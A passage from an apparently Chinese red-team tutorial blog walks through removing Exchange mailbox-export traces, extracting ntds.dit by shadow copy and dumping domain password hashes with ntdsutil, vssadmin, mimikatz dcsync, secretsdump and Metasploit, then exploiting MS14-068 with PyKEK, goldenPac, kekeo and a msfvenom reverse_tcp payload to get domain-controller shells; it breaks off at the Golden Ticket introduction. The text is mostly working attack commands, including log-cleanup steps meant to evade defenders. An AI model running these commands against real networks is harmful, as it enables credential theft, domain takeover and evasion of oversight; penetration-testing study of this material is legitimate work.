导出还是通过图形化的方式导出，都会在 Exchange 中生成一条告警信息，这些信息有助于 BT 发现服务器里的异常行为，通过以下命令，可以查看之前的导出请求记录信息。</p><pre class="line-numbers language-none"><code class="language-none">Get-MailboxExportRequest<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将指定用户已经完成的导出请求删除</p><pre class="line-numbers language-none"><code class="language-none">Remove-MailboxExportRequest -Identity Administrator\MailboxExport<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>删除所有已完成的导出请求</p><pre class="line-numbers language-none"><code class="language-none">Get-MailboxExportRequest -Status Completed | Remove-MailboxExportRequest<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>删除所有导出请求，包括完成和失败的请求</p><pre class="line-numbers language-none"><code class="language-none">Get-MailboxExportRequest | Remove-MailboxExportRequest<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="0x26-ntds-dit-的提取与散列值导出"><a href="#0x26-ntds-dit-的提取与散列值导出" class="headerlink" title="0x26 ntds.dit 的提取与散列值导出"></a>0x26 ntds.dit 的提取与散列值导出</h1><h2 id="0、前言-6"><a href="#0、前言-6" class="headerlink" title="0、前言"></a>0、前言</h2><p>在活动目录中，所有数据都保存在 ntds.dit 文件中，ntds.dit 是一个二进制文件，存储位置为域控的 %SystemRoot%\ntds.dit</p><p>ntds.dit 中包含（但不限于）用户名、散列值、组、GPP、OU 等与活动目录相关的信息，因此如果我们拿到 ntds.dit 就能获取到域内所有用户的 hash</p><p>在通常情况下，即使拥有管理员权限，也无法读取域控中的 ntds.dit 文件（因为活动目录始终访问这个文件，所以文件被禁止读取），它和 SAM 文件一样，是被 Windows 操作系统锁定的。</p><p>不过使用 Windows 本地卷影拷贝服务，就可以获得文件的副本（类似于虚拟机的快照）</p><h2 id="1、使用卷影拷贝服务提取-ntds-dit"><a href="#1、使用卷影拷贝服务提取-ntds-dit" class="headerlink" title="1、使用卷影拷贝服务提取 ntds.dit"></a>1、使用卷影拷贝服务提取 ntds.dit</h2><h3 id="ntdsutil"><a href="#ntdsutil" class="headerlink" title="ntdsutil"></a>ntdsutil</h3><p>ntdsutil 是一个为活动目录提供管理机制的命令行工具，使用 ntdsutil 可以维护和管理活动目录数据库、控制单个主机操作、创建应用程序目录分区、删除由未使用活动目录安装向导（DCPromo.exe）成功降级的与控制器留下的元数据等。</p><p>该工具默认安装在域控上，使用以下命令创建一个快照，该快照包含 Windows 中的所有文件，且在复制文件时不会受到 Windows 锁定机制的限制。</p><pre class="line-numbers language-none"><code class="language-none">ntdsutil snapshot &quot;activate instance ntds&quot; create quit quit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>加载刚刚创建的快照</p><pre class="line-numbers language-none"><code class="language-none">ntdsutil snapshot &quot;mount &#123;ce2f5901-022f-4c21-b266-b4c14db67749&#125;&quot; quit quit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用 copy 命令将快照中的文件复制到 C 盘下</p><pre class="line-numbers language-none"><code class="language-none">copy C:\$SNAP_202109081356_VOLUMEC$\windows\NTDS\ntds.dit C:\ntds.dit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>删除之前加载的快照</p><pre class="line-numbers language-none"><code class="language-none">ntdsutil snapshot &quot;unmount &#123;ce2f5901-022f-4c21-b266-b4c14db67749&#125;&quot; &quot;delete &#123;ce2f5901-022f-4c21-b266-b4c14db67749&#125;&quot; quit quit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查询当前系统中的快照，可以看到没有任何快照</p><pre class="line-numbers language-none"><code class="language-none">ntdsutil snapshot &quot;List All&quot; quit quit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210908135855.png"></p><h3 id="vssadmin"><a href="#vssadmin" class="headerlink" title="vssadmin"></a>vssadmin</h3><p>vssadmin 可用于创建和删除卷影拷贝、列出卷影的信息（只能管理系统 Provider 创建的卷影拷贝）、显示已安装的所有卷影拷贝写入程序（writers）和提供程序（providers），以及改变卷影拷贝的存储空间（即所谓的 “diff 空间”）的大小等。</p><p>vssadmin 的使用流程和 ntdsutil 差不多，首先创建一个 C 盘的卷影拷贝</p><pre class="line-numbers language-none"><code class="language-none">vssadmin create shadow &#x2F;for&#x3D;C:<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在创建的卷影拷贝中将 ntds.dit 复制出来</p><pre class="line-numbers language-none"><code class="language-none">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy12\windows\NTDS\ntds.dit C:\ntds.dit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>删除快照</p><pre class="line-numbers language-none"><code class="language-none">vssadmin delete shadows &#x2F;for&#x3D;C: &#x2F;quiet<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210908145721.png"></p><h3 id="vssown-vbs"><a href="#vssown-vbs" class="headerlink" title="vssown.vbs"></a>vssown.vbs</h3><p>vssown.vbs 脚本的功能和 vssadmin 类似，可用于创建和删除卷影拷贝以及启动和停止卷影拷贝服务。</p><p>vssown.vbs 下载地址：<a href="https://raw.githubusercontent.com/borigue/ptscripts/master/windows/vssown.vbs">https://raw.githubusercontent.com/borigue/ptscripts/master/windows/vssown.vbs</a></p><p>启动卷影拷贝服务</p><pre class="line-numbers language-none"><code class="language-none">cscript vssown.vbs &#x2F;start<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>创建一个 C 盘的卷影拷贝</p><pre class="line-numbers language-none"><code class="language-none">cscript vssown.vbs &#x2F;create c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>列出当前卷影拷贝</p><pre class="line-numbers language-none"><code class="language-none">cscript vssown.vbs &#x2F;list<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>复制 ntds.dit</p><pre class="line-numbers language-none"><code class="language-none">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy14\windows\NTDS\ntds.dit C:\ntds.dit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>删除卷影拷贝</p><pre class="line-numbers language-none"><code class="language-none">cscript vssown.vbs &#x2F;delete &#123;22B93FE6-D53A-4ECA-BD5A-7A2A68203EF8&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210908152359.png"></p><h3 id="IFM"><a href="#IFM" class="headerlink" title="IFM"></a>IFM</h3><p>除了上面介绍的通过执行命令来提取 ntds.dit，也可以通过创建一个 IFM 的方式获取 ntds.dit</p><p>在使用 ntdsutil 创建媒体安装集（IFM）时，需要进行生成快照、加载、将 ntds.dit 和计算机的 SAM 文件复制到目标文件夹中等操作，这些操作也可以通过 PowerShell 或 VMI 远程执行。</p><p>在域控中以管理员模式打开命令行环境，输入命令</p><pre class="line-numbers language-none"><code class="language-none">ntdsutil &quot;ac i ntds&quot; &quot;ifm&quot; &quot;create full c:&#x2F;test&quot; q q<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>此时 ntds.dit 将被保存在 C:\test\Active Directory 下，SYSTEN 和 SECURITY 两个文件将被保存在 C:\test\registry 文件夹下</p><p>将 ntds.dit 拖回本地后，在目标机器上将 test 文件夹删除</p><pre class="line-numbers language-none"><code class="language-none">rmdir &#x2F;s&#x2F;q C:\test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Copy-VSS-ps1"><a href="#Copy-VSS-ps1" class="headerlink" title="Copy-VSS.ps1"></a>Copy-VSS.ps1</h3><p>nishang 工具包里的 Copy-VSS.ps1 也可以将 ntds.dit 提取出来，nishang 工具包地址：<a href="https://github.com/samratashok/nishang">https://github.com/samratashok/nishang</a></p><pre class="line-numbers language-none"><code class="language-none">Import-Module .\Copy-VSS.ps1Copy-vss或者PowerShell -Exec bypass -C &quot;Import-module .\Copy-VSS.ps1;Copy-vss&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>通过该脚本，可以将 SAM、SYSTEM，ntds.dit 复制到与 ps1 脚本相同的目录下。</p><h3 id="diskshadow"><a href="#diskshadow" class="headerlink" title="diskshadow"></a>diskshadow</h3><p>diskshadow 和 vshadow 功能类似，不过 vshadow 是包含在 Windows SDK 里的，因此实际应用的时候还需要将其上传到目标机器上。</p><blockquote><p>diskshadow 有交互模式和非交互模式，在使用交互模式时，需要在图形化界面里操作</p></blockquote><p>首先创建一个 txt 文件，内容如下：</p><pre class="line-numbers language-none"><code class="language-none">set context persistent nowritersadd volume c: alias someAliascreateexpose %someAlias% k:exec &quot;C:\windows\system32\cmd.exe&quot; &#x2F;c copy k:\Windows\NTDS\ntds.dit C:\ntds.ditdelete shadows alllist shadows allresetexit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用 diskshadow 调用刚才的文本文件</p><pre class="line-numbers language-none"><code class="language-none">diskshadow &#x2F;s C:\command.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>因为 system.hive 里存放着 ntds.dit 的秘钥，所以需要转储 system.hive ，不然没法查看 ntds.dit 里内容</p><pre class="line-numbers language-none"><code class="language-none">reg save hklm\system c:\windows\temp\system.hive<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210908155944.png"></p><h3 id="Invoke-NinjaCopy-ps1"><a href="#Invoke-NinjaCopy-ps1" class="headerlink" title="Invoke-NinjaCopy.ps1"></a>Invoke-NinjaCopy.ps1</h3><p>PowerSploit 工具包里的 Invoke-NinjaCopy.ps1 脚本也可以提取 ntds.dit 文件，这种方法没有调用 Volume Shadow Copy 服务，所以不会产生日志文件</p><p>PowerSploit 工具包项目地址：<a href="https://github.com/PowerShellMafia/PowerSploit">https://github.com/PowerShellMafia/PowerSploit</a></p><pre class="line-numbers language-none"><code class="language-none">Import-Module .\Invoke-NinjaCopy.ps1Invoke-NinjaCopy -Path &quot;C:\windows\ntds\ntds.dit&quot; -LocalDestination &quot;C:\ntds.dit&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="impacket"><a href="#impacket" class="headerlink" title="impacket"></a>impacket</h3><p>impacket 安装</p><pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;SecureAuthCorp&#x2F;impacket.gitcd impacketpython3 setup.py install<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>通过 impacket  里的 secretsdump.py 脚本可以直接远程读取 ntds.dit 并导出哈希值</p><pre class="line-numbers language-none"><code class="language-none">cd .&#x2F;build&#x2F;scripts-3.9python3 secretsdump.py teamssix.com&#x2F;administrator:1qaz@WSX@192.168.7.7 -outputfile output_ntds<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2、导出-ntds-dit-文件中的散列值"><a href="#2、导出-ntds-dit-文件中的散列值" class="headerlink" title="2、导出 ntds.dit 文件中的散列值"></a>2、导出 ntds.dit 文件中的散列值</h2><h3 id="esedbexport"><a href="#esedbexport" class="headerlink" title="esedbexport"></a>esedbexport</h3><p>安装 esedbexport，以 Kali 为例</p><pre class="line-numbers language-none"><code class="language-none">apt-get install autoconf automake autopoint libtool pkg-configwget https:&#x2F;&#x2F;github.com&#x2F;libyal&#x2F;libesedb&#x2F;releases&#x2F;download&#x2F;20210424&#x2F;libesedb-experimental-20210424.tar.gztar zxvf libesedb-experimental-20210424.tar.gzcd libesedb-20210424.&#x2F;configuremakemake installldconfig<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>导出 ntds.dit</p><pre class="line-numbers language-none"><code class="language-none">esedbexport -m tables ntds.dit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>安装 ntdsxtract</p><pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;csababarta&#x2F;ntdsxtract.gitcd ntdsxtractpython setup.py buildpython setup.py install<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将 ntds.dit.export 和 SYSTEM 文件放入到 ntdsxtract 工具的文件夹中，然后导出哈希值，最后的结果将保存在 all_user.txt 里</p><pre class="line-numbers language-none"><code class="language-none">python2 dsusers.py ntds.dit.export&#x2F;datatable.3 ntds.dit.export&#x2F;link_table.5 output --syshive SYSTEM --passwordhasher --pwdformat ocl --ntoufile atout --lmoufile lmout | tee all_user.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>如果提示 ImportError: No module named Crypto.Hash，直接 pip install pycryptodome 即可</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210908171420.png"></p><p>ntds.dit 包含域内的所有信息，可以通过分析 ntds.dit 导出域内的计算机信息以及其他信息，最后结果将保存在 all_computers.csv 文件内</p><pre class="line-numbers language-none"><code class="language-none">python2 dscomputers.py ntds.dit.export&#x2F;datatable.3 computer_output --csvoutfile all_computers.csv<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="impacket-1"><a href="#impacket-1" class="headerlink" title="impacket"></a>impacket</h3><p>将 ntds.dit.export 和 SYSTEM 文件放入到 impacket 工具的文件夹中</p><pre class="line-numbers language-none"><code class="language-none">impacket-secretsdump -system SYSTEM -ntds ntds.dit LOCAL<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者直接使用 python 执行 secretsdump.py 文件</p><pre class="line-numbers language-none"><code class="language-none">cd .&#x2F;build&#x2F;scripts-3.9python3 secretsdump.py -system SYSTEM -ntds ntds.dit LOCAL<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="NTDSDump-exe"><a href="#NTDSDump-exe" class="headerlink" title="NTDSDump.exe"></a>NTDSDump.exe</h3><p>NTDSDumpEx.exe 可以进行导出哈希值的操作，下载地址：<a href="https://github.com/zcgonvh/NTDSDumpEx/releases">https://github.com/zcgonvh/NTDSDumpEx/releases</a></p><pre class="line-numbers language-none"><code class="language-none">NTDSDumpEx -d ntds.dit -s system -o domain.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="mimikatz-1"><a href="#mimikatz-1" class="headerlink" title="mimikatz"></a>mimikatz</h3><p>mimikatz 有个 dcsync 的功能，可以利用卷影拷贝服务直接读取 ntds.dit 文件，不过需要管理员权限。</p><p>导出域内所有用户的用户名和哈希值</p><pre class="line-numbers language-none"><code class="language-none">lsadump::dcsync &#x2F;domain:teamssix.com &#x2F;all &#x2F;csv<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>导出域内指定用户的用户名和哈希值</p><pre class="line-numbers language-none"><code class="language-none">lsadump::dcsync &#x2F;domain:teamssix.com &#x2F;user:administrator<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>也可以通过转储 lsass.exe 进行 dump 操作</p><pre class="line-numbers language-none"><code class="language-none">privilege::debuglsadump::lsa &#x2F;inject<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>如果输出内容太多，可以使用 log 命令，这样操作就都会被记录到文本里了</p></blockquote><h3 id="Invoke-DCSync-ps1"><a href="#Invoke-DCSync-ps1" class="headerlink" title="Invoke-DCSync.ps1"></a>Invoke-DCSync.ps1</h3><p>该脚本通过 Invoke-ReflectivePEinjection 调用 mimikatz.dll 中的 dcsync 功能，并利用 dcsync 直接读取 ntds.dit 得到域用户密码散列值</p><p>Invoke-DCSync.ps1 下载地址：<a href="https://gist.github.com/monoxgas/9d238accd969550136db">https://gist.github.com/monoxgas/9d238accd969550136db</a></p><pre class="line-numbers language-none"><code class="language-none">Import-Module .&#x2F;Invoke-DCSync.ps1Invoke-DCSync -PWDumpFormat<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="MSF-2"><a href="#MSF-2" class="headerlink" title="MSF"></a>MSF</h3><p>msf 里的 psexec_ntdsgrab 可以获取目标的 ntds.dit 和 SYSTEM 并将其保存到 /root/.msf4/loot/ 目录下 </p><pre class="line-numbers language-none"><code class="language-none">use auxiliary&#x2F;admin&#x2F;smb&#x2F;psexec_ntdsgrabset rhosts 192.168.7.7set smbdomain teamssix.comset smbuser administratorset smbpass 1qaz@WSXrun<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>除此之外，在获取到会话后，也可以直接用 MSF 提供的模块获取 ntds.dit</p><pre class="line-numbers language-none"><code class="language-none">use windows&#x2F;gather&#x2F;credentials&#x2F;domain_hashdumpset session 1run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p>注意生成的 payload 需要和目标系统位数一致，不然会报错</p></blockquote><h3 id="DSInternals"><a href="#DSInternals" class="headerlink" title="DSInternals"></a>DSInternals</h3><p>DSInternals 主要功能包括离线 ntds.dit 文件操作以及通过目录复制服务（DRS）远程协议查询域控制器。</p><p>DSInternals 下载地址：<a href="https://github.com/MichaelGrafnetter/DSInternals/releases">https://github.com/MichaelGrafnetter/DSInternals/releases</a></p><p>安装 DSInternals</p><pre class="line-numbers language-none"><code class="language-none">Install-Module DSInternals -Force<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>直接导出 hash，并保存在 output_hash.txt 文件里</p><pre class="line-numbers language-none"><code class="language-none">$key &#x3D; Get-Bootkey -SystemHivePath &#39;C:\system&#39;Get-ADDBAccount -All -DBPath &#39;C:\ntds.dit&#39; -Bootkey $key | Out-File output_hash.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>或者导出 hashcat 支持的 hash，并保存在 output_hashcat.txt 文件里</p><pre class="line-numbers language-none"><code class="language-none">$key &#x3D; Get-Bootkey -SystemHivePath &#39;C:\system.hive&#39;Get-ADDBAccount -All -DBPath &#39;C:\ntds.dit&#39; -BootKey $key | Format-Custom -View HashcatNT | Out-File output_hashcat.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="vshaow-和-QuarksPwDump"><a href="#vshaow-和-QuarksPwDump" class="headerlink" title="vshaow 和 QuarksPwDump"></a>vshaow 和 QuarksPwDump</h3><p>在正常的域环境中，ntds.dit 文件里包含大量的信息，体积较大，不方便保存到本地。</p><p>如果域控制器上没有安装杀毒软件，攻击者就能直接进入域控制器，导出 ntds.dit 并获得域账号和域散列值，而不需要将 ntds.dit 保存到本地。</p><p>QuarksPwDump 可以快速、安全、全面地读取全部域账号和域散列值。</p><p>QuarksPwDump 下载地址：<a href="https://github.com/tuthimi/quarkspwdump/tree/master/Release">https://github.com/tuthimi/quarkspwdump/tree/master/Release</a></p><p>ShadowCopy.bat 使用微软的卷影拷贝技术，能够复制被锁定的文件及被其他程序打开的文件，代码如下</p><pre class="line-numbers language-none"><code class="language-none">setlocalif NOT &quot;%CALLBACK_SCRIPT%&quot;&#x3D;&#x3D;&quot;&quot; goto :IS_CALLBACKset SOURCE_DRIVE_LETTER&#x3D;%SystemDrive%set SOURCE_RELATIVE_PATH&#x3D;windows\ntds\ntds.ditset DESTINATION_PATH&#x3D;%~dp0@echo ...Determine the scripts to be executed&#x2F;generated...set CALLBACK_SCRIPT&#x3D;%~dpnx0set TEMP_GENERATED_SCRIPT&#x3D;GeneratedVarsTempScript.cmd@echo ...Creating the shadow copy...&quot;%~dp0vshadow.exe&quot; -script&#x3D;%TEMP_GENERATED_SCRIPT% -exec&#x3D;&quot;%CALLBACK_SCRIPT%&quot; %SOURCE_DRIVE_LETTER%del &#x2F;f %TEMP_GENERATED_SCRIPT%@goto :EOF:IS_CALLBACKsetlocal@echo ...Obtaining the shadow copy device name...call %TEMP_GENERATED_SCRIPT%@echo ...Copying from the shadow copy to the destination path...copy &quot;%SHADOW_DEVICE_1%\%SOURCE_RELATIVE_PATH%&quot; %DESTINATION_PATH%reg save hklm\system system.hive<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>vshadow.exe 是从 Windows SDK 中提取出来的，需要先安装 Windows SDK，下载地址：<a href="https://developer.microsoft.com/en-us/windows/downloads/sdk-archive/">https://developer.microsoft.com/en-us/windows/downloads/sdk-archive/</a></p><p>Windows SDK 下载安装完后，找到 vshadow.exe ，我这里的路径是：</p><pre class="line-numbers language-none"><code class="language-none">C:\Program Files\Microsoft SDKs\Windows\v7.1\Bin\x64\vsstools\vshadow.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将这三个文件放到同一个文件夹里后，运行 ShadowCopy.bat 文件，之后可以看到导出了 ntds.dit 和 system.hive 文件</p><p>使用 esentutl 修复导出的 ntds.dit 文件</p><pre class="line-numbers language-none"><code class="language-none">esentutl &#x2F;p &#x2F;o ntds.dit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>最后通过 QuarksPwDump.exe 导出域账号和散列值</p><pre class="line-numbers language-none"><code class="language-none">QuarksPwDump.exe -dhd -sf system.hive -nt ntds.dit -o log.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在 log 里就能看到导出的密码哈希了。</p><h1 id="0x27-Kerberos-域用户提权漏洞"><a href="#0x27-Kerberos-域用户提权漏洞" class="headerlink" title="0x27 Kerberos 域用户提权漏洞"></a>0x27 Kerberos 域用户提权漏洞</h1><h2 id="0、前言-7"><a href="#0、前言-7" class="headerlink" title="0、前言"></a>0、前言</h2><p>在 2014 年微软修复了 Kerberos 域用户提权漏洞，即 MS14-068，CVE 编号为 CVE-2014-6324，该漏洞影响了 Windows Server 2012 R2 以下的服务器，该漏洞允许 RT 将任意用户权限提升至域管级别。</p><p>不过从漏洞年代就知道这已经是个远古时代的漏洞，现实中已经很少会碰到了，这里就简单记录下，顺便熟悉熟悉工具的用法。</p><p>14-068 产生的原因主要在于用户可以利用伪造的票据向认证服务器发起请求，如果用户伪造域管的票据，服务端就会把拥有域管权限的服务票据返回回来。</p><h2 id="1、PyKEK"><a href="#1、PyKEK" class="headerlink" title="1、PyKEK"></a>1、PyKEK</h2><p>PyKEK 是一个利用 Kerberos 协议进行渗透的工具包，下载地址：<a href="https://github.com/mubix/pykek">https://github.com/mubix/pykek</a></p><p>使用 PyKEK 可以生成一个高权限的服务票据，之后通过 mimikatz 将服务票据导入到内存中。</p><p>MS 14-068 的补丁为：KB3011780，通过 wmic 查看补丁情况</p><pre class="line-numbers language-none"><code class="language-none">wmic qfe get hotfixid | findstr KB3011780<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看当前用户 SID</p><pre class="line-numbers language-none"><code class="language-none">whoami &#x2F;user<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者使用 wmic </p><pre class="line-numbers language-none"><code class="language-none">wmic useraccount get name,sid<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>生成高权限票据，-d 指定域控地址</p><pre class="line-numbers language-none"><code class="language-none">python2 ms14-068.py -u jack@0day.org -s S-1-5-21-1812960810-2335050734-3517558805-1133 -d 192.168.3.142 -p Aa123456<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>打开 mimikatz 清除当前内存中的票据信息</p><pre class="line-numbers language-none"><code class="language-none">kerberos::purge<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将高权限票据注入内存</p><pre class="line-numbers language-none"><code class="language-none">kerberos::ptc &quot;TGT_jack@0day.org.ccache&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用 net use 连接域控后，使用 psexec 获取 Shell</p><blockquote><p>这里 net ues 使用 IP 可能会失败，因此在此使用机器名进行连接 </p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202109231733653.png"></p><h2 id="2、GoldenPac"><a href="#2、GoldenPac" class="headerlink" title="2、GoldenPac"></a>2、GoldenPac</h2><p>goldenPac.py 是一个用于对 Kerberos 协议进行测试的工具，它集成在 impacket 工具包里。</p><p>Kali 在使用之前需要先安装 Kerberos 客户端</p><pre class="line-numbers language-none"><code class="language-none">apt-get install krb5-user -y<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>利用 goldenPac.py 获取 Shell</p><pre class="line-numbers language-none"><code class="language-none">python3 goldenPac.py 0day.org&#x2F;jack:Aa123456@OWA2010SP3.0day.org<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>这里使用 IP 进行连接会连接不成功，只能使用主机名，因此可以在 hosts 文件中添加主机名对应的 IP</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202109231746641.png"></p><p>goldenPac.py 是通过 PsExec 获得 Shell 的，因此会产生大量的日志，而且现在这种连接方式也已经被各大杀软所拦截。</p><h2 id="3、kekeo"><a href="#3、kekeo" class="headerlink" title="3、kekeo"></a>3、kekeo</h2><p>kekeo 也是一个工具集，其中包含了 ms14-068 的利用模块，kekeo 下载地址：<a href="https://github.com/gentilkiwi/kekeo">https://github.com/gentilkiwi/kekeo</a></p><p>使用之前需要先清除票据</p><pre class="line-numbers language-none"><code class="language-none">klist purge<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后直接使用 kekeo 生成高权限票据</p><pre class="line-numbers language-none"><code class="language-none">kekeo.exe &quot;exploit::ms14068 &#x2F;domain:0day.org &#x2F;user:jack &#x2F;password:Aa123456 &#x2F;ptt&quot; &quot;exit&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>之后就可以直接 dir 域控或者 PsExec 连接到域控了</p><h2 id="4、MSF"><a href="#4、MSF" class="headerlink" title="4、MSF"></a>4、MSF</h2><p>MSF 中也有 MS 14-086 的提权 EXP，不过需要结合 mimikatz 进行利用</p><pre class="line-numbers language-none"><code class="language-none">use auxiliary&#x2F;admin&#x2F;kerberos&#x2F;ms14_068_kerberos_checksumset domain 0day.orgset password Aa123456set user jackset user_sid  S-1-5-21-1812960810-2335050734-3517558805-1133set rhosts OWA2010SP3.0day.orgrun<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>设置好域名、域控 IP、密码、用户、SID 后运行，将会获取一个 bin 文件</p><p>由于 MSF 里不支持 bin 文件的导入，因此需要 mimikatz 对其进行格式转换</p><pre class="line-numbers language-none"><code class="language-none">kerberos::clist &quot;20210923061821_default_192.168.3.142_windows.kerberos_484249.bin&quot; &#x2F;export<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>之后，生成一个木马</p><pre class="line-numbers language-none"><code class="language-none">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;172.16.214.74 lport&#x3D;4444 -f exe &gt; shell.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将木马复制到目标主机上，并使其上线到 MSF</p><p>获得会话后，将刚才 mimikatz 转换后的 kirbi 文件导入到会话中</p><pre class="line-numbers language-none"><code class="language-none">load kiwikerberos_ticket_use &#x2F;tmp&#x2F;0-00000000-jack@krbtgt-0DAY.ORG.kirbibackground<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>之后使用 current_user_psexec 模块</p><pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;windows&#x2F;local&#x2F;current_user_psexecset session 2set rhosts OWA2010SP3.0day.orgset payload windows&#x2F;meterpreter&#x2F;reverse_tcpset lhost 172.16.214.74run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后就会返回高权限的会话</p><blockquote><p>不过 MSF 在使用过程中报错了，网上一查发现别人也有这个错误，暂时还不清楚解决的方法</p></blockquote><h2 id="5、CS"><a href="#5、CS" class="headerlink" title="5、CS"></a>5、CS</h2><p>先利用前面的 ms14-068.py 生成一个 ccache 文件，之后使用 KrbCredExport 将 ccache 文件转为 kirbi 格式</p><p>KrbCredExport 下载地址：<a href="https://github.com/rvazarkar/KrbCredExport">https://github.com/rvazarkar/KrbCredExport</a></p><pre class="line-numbers language-none"><code class="language-none">python2 KrbCredExport.py TGT_jack@0day.org.ccache user.ticket<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>接着使用 CS 的 kerberos_ticket_use 加载 ticket，之后就能访问到域控了</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202109240943968.png"></p><p>此时想让域控上线自然也是没问题的了，可以先添加一个域控地址的 target，然后选择 PsExec ，勾选上 use session’s current access token 通过 jack 的会话上线即可。</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202109241000974.png"></p><h1 id="0x28-黄金票据"><a href="#0x28-黄金票据" class="headerlink" title="0x28 黄金票据"></a>0x28 黄金票据</h1><h2 id="0、前言-8"><a href="#0、前言-8" class="headerlink" title="0、前言"></a>0、前言</h2><p>RT 在利用黄金票据（Golden Ticket）进行 PTP 票据传递时，需要先知道以下信息：</p><ul><li>伪造的域管理员用户名</li><li>完整的域名</li><li>域 SID</li><li>krbtgt 的 NTLM Hash 或 AES-256 值</li></ul><p>其中 krbtgt 用户是域自带的用户，被 KDC 密钥分发中心服务所使用，属于 Domain Admins 组。</p><p>在域环境中，每个用户账号的票据都是由 krbtgt 用户所生成的，因此如果知道了 krbtgt 用户的 NTLM Hash 或者 AES-256 